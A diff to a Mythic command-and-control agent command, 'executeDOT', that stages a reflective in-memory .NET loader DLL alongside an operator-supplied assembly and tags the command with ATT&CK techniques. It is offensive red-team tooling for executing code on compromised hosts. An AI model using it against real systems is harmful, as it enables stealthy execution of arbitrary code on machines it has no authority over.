@@ -1,6 +1,8 @@
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
-import json, sys, base64
+import json, sys, pathlib
+
+DOT_LOADER_PATH = pathlib.Path("/opt/loaders/dot_loader.dll")
 
 
 class ExecuteDOTArguments(TaskArguments):
@@ -8,14 +10,14 @@ class ExecuteDOTArguments(TaskArguments):
         super().__init__(command_line, **kwargs)
         self.args = [
             CommandParameter(
-                name="file_id", 
-                type=ParameterType.File, 
-                description="file to upload"
+                name="file_id",
+                type=ParameterType.File,
+                description=".NET assembly to execute",
             ),
             CommandParameter(
                 name="parameters",
                 type=ParameterType.String,
-                description="--param=value",
+                description="Space-separated arguments for the .NET assembly",
             ),
         ]
 
@@ -32,32 +34,37 @@ class ExecuteDOTCommand(CommandBase):
     cmd = "executeDOT"
     needs_admin = False
     help_cmd = "executeDOT"
-    description = (
-        "Executes a DotNetFile "
-    )
-    version = 1
+    description = "Execute a .NET assembly via reflective in-memory loader"
+    version = 2
     author = "@PatchRequest"
     attackmapping = ["T1132", "T1030", "T1105"]
     argument_class = ExecuteDOTArguments
-
 
     async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
         response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
             TaskID=taskData.Task.ID,
             Success=True,
         )
-        try:
-            file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
+
+        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
+            TaskID=taskData.Task.ID,
+            AgentFileID=taskData.args.get_arg("file_id"),
+        ))
+
+        loader_file_id = ""
+        if DOT_LOADER_PATH.exists():
+            loader_data = DOT_LOADER_PATH.read_bytes()
+            create_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                 TaskID=taskData.Task.ID,
-                AgentFileID=taskData.args.get_arg("file")
+                FileContents=loader_data,
+                DeleteAfterFetch=False,
             ))
-            #taskData.args.get_arg("parameters")
-                
-        except Exception as e:
-            raise Exception("Error from Mythic: " + str(sys.exc_info()[-1].tb_lineno) + " : " + str(e))
+            if create_resp.Success:
+                loader_file_id = create_resp.AgentFileId
+
+        taskData.args.add_arg("loader_file_id", loader_file_id, type=ParameterType.String)
+
         return response
 
-
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
-        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
-        return resp
+        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
